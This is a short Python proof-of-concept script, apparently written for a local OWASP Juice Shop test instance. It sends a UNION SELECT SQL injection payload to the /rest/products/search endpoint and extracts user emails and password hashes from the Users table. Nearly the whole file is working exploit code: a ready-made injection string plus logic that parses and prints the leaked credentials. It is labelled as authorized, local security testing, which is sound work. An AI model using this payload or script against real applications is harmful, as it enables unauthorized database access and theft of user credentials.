#!/usr/bin/env python3
"""JUICE-002 - UNION-based SQL Injection in product search (authorized, local only).

Uses a UNION SELECT against GET /rest/products/search?q= to pull user emails and
password hashes that should never appear in a product search.

Usage:  python juice_002_sqli_union.py [base_url]
        (default base_url: http://localhost:3000)
"""
import sys
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
PAYLOAD = "qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"


def main() -> int:
    r = requests.get(f"{BASE}/rest/products/search", params={"q": PAYLOAD}, timeout=15)
    print(f"GET /rest/products/search?q=<UNION payload>  ->  HTTP {r.status_code}")
    if r.status_code != 200:
        print("Injection FAILED:", r.text[:200])
        return 1

    rows = r.json().get("data", [])
    # In the injected rows, email lands in 'name' and the password hash in 'description'.
    leaked = [(row.get("name"), row.get("description")) for row in rows
              if isinstance(row.get("name"), str) and "@" in row.get("name", "")]
    print(f"Rows returned: {len(rows)}  |  leaked credential rows: {len(leaked)}")
    for email, pw_hash in leaked[:5]:
        print(f"  {email:30}  {pw_hash}")
    if leaked:
        print("JUICE-002 reproduced: user emails + password hashes extracted via UNION SQLi.")
        return 0
    print("No credentials leaked - check column count / payload.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
